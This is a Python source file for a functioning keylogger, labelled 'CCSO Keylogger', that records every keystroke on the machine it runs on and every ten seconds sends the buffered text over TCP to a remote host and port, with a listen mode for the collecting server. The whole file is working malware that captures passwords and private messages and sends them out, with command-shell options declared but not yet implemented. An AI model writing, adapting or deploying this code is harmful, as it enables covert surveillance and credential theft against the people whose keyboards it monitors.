import argparse
import textwrap
import keyboard
import sys
import socket
import threading
from datetime import datetime

class Keylogger:
    def __init__(self):
        self.args = args
        self.log = ""
        self.interval = 10
        self.master_log = ""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def callback(self, event):
        name = event.name

        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name

    def send_log(self):
        self.master_log += self.log

        if self.log:
            self.end_time = datetime.now()

            try:
                self.socket.connect((self.args.target, self.args.port))
            except:
                pass

            if self.log:
                self.socket.send(f"\n--- New Log Instance @ {self.time} ---\n".encode())
                self.socket.send(self.log.encode())
                self.socket.send(f"\n--- End Of Log Instance @ {self.end_time} ---\n".encode())

            with open(self.args.outfile, "w") as f:
                f.write(self.log)

        self.log = ""

        timer = threading.Timer(interval=self.interval, function=self.send_log)
        timer.start()

    def handle(self, client_socket):
        buf = b""
        while True:
            data = client_socket.recv(4096)
            if data:
                buf += data
            else:
                break

            with open(self.args.outfile, "w") as f:
                f.write(buf.decode())

    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)

        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()

    def start(self):
        if self.args.listen:
            self.listen()
        else:
            try:
                self.time = datetime.now()
                keyboard.on_release(callback=self.callback)
                self.send_log()
                keyboard.wait()

            except KeyboardInterrupt:
                sys.exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='CCSO Keylogger', formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent('''Example:
        do this later :)
    '''))
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=9001, help='specified port')
    parser.add_argument('-t', '--target', default='localhost', help='specified IP')
    parser.add_argument('-o', '--outfile', default='keys.log', help='Output file')

    args = parser.parse_args()

    kl = Keylogger()
    kl.start()
